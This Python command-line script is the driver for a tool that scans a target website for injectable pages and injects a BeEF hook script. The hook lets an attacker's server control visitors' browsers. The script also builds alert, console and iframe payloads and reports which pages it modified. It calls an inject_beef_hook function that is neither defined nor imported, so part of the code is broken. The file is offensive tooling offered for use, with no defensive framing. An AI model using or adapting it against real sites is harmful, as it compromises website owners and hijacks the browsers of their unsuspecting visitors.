#!/usr/bin/env python3

import argparse
import requests
import re
from urllib.parse import urljoin, urlparse
from beef_injection import BeEFInjector

def main():
    parser = argparse.ArgumentParser(description="BeEF Hook Injection Tool")
    parser.add_argument("target", help="Target domain or URL")
    parser.add_argument("--hook-url", default="http://localhost:3000/hook.js", 
                       help="BeEF hook URL (default: http://localhost:3000/hook.js)")
    parser.add_argument("--payload-type", choices=["hook", "alert", "console", "iframe"], 
                       default="hook", help="Type of payload to inject")
    parser.add_argument("--scan-only", action="store_true", 
                       help="Only scan for injection points, don't inject")
    parser.add_argument("--test", action="store_true", 
                       help="Test injection without actually injecting")
    
    args = parser.parse_args()
    
    print("🐮 BeEF Hook Injection Tool")
    print("=" * 40)
    
    injector = BeEFInjector(args.hook_url)
    
    print(f"Target: {args.target}")
    print(f"BeEF Hook: {args.hook_url}")
    print(f"Payload Type: {args.payload_type}")
    print()
    
    if args.scan_only:
        print("🔍 Scanning for injection points...")
        injectable_pages = injector.scan_for_injectable_pages(args.target)
        
        print(f"\nFound {len(injectable_pages)} injectable pages:")
        for i, page in enumerate(injectable_pages, 1):
            print(f"  {i}. {page['url']} ({page['type']})")
            
        if injectable_pages:
            print(f"\n💡 Use these URLs for injection:")
            for page in injectable_pages:
                payload = injector.create_injection_payload(page['url'], args.payload_type)
                print(f"  URL: {page['url']}")
                print(f"  Payload: {payload['payload']}")
                print()
    
    elif args.test:
        print("🧪 Testing injection...")
        payload = injector.create_injection_payload(args.target, args.payload_type)
        result = injector.test_injection(args.target, payload['payload'])
        
        print(f"Test Result: {result['status']}")
        if result['status'] == 'error':
            print(f"Error: {result['error']}")
    
    else:
        print("🚀 Injecting BeEF hook...")
        results = inject_beef_hook(args.target)
        
        print(f"\nInjection Results:")
        print(f"  Target: {results['target']}")
        print(f"  Injectable Pages: {len(results['injectable_pages'])}")
        print(f"  Injection Results: {len(results['injection_results'])}")
        
        for result in results['injection_results']:
            print(f"  - {result['url']}: {result['status']}")
            if result['status'] == 'success':
                print(f"    Size change: {result['original_size']} -> {result['modified_size']} bytes")
        
        print(f"\n📋 Generated Payloads:")
        for payload in results['payloads']:
            print(f"  URL: {payload['target_url']}")
            print(f"  Type: {payload['payload_type']}")
            print(f"  Payload: {payload['payload']}")
            print()

if __name__ == "__main__":
    main() 